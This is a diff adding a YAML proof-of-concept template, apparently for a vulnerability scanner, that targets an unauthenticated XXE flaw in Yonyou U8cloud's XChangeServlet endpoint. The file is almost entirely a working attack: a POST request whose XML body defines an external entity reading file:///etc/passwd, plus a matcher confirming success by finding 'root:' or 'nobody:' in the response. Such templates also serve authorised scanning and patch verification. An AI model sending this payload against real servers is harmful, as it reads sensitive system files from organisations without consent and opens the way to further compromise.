@@ -1,0 +1,18 @@
+name: poc-yaml-yonyou-u8cloud-xchangeservlet-xxe
+groups:
+  xxe:
+    - method: POST
+      path: /service/XChangeServlet
+      headers:
+        Content-Type: text/xml
+      body: >-
+        <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><a>&xxe;</a></r>
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"root:") || response.body.bcontains(b"nobody:"))
+detail:
+  author: L4xy
+  description: "用友U8cloud XChangeServlet接口存在XXE漏洞，攻击者无需登录即可通过构造恶意XML请求读取服务器敏感文件，可导致服务器数据泄露以及被远控"
+  links:
+    - https://github.com/Co5mos/nuclei-tps/blob/main/http/vulnerabilities/yonyou/yonyou-u8-cloud-xchangeservlet-xxe.yaml
+  tags: xxe,yonyou,u8cloud
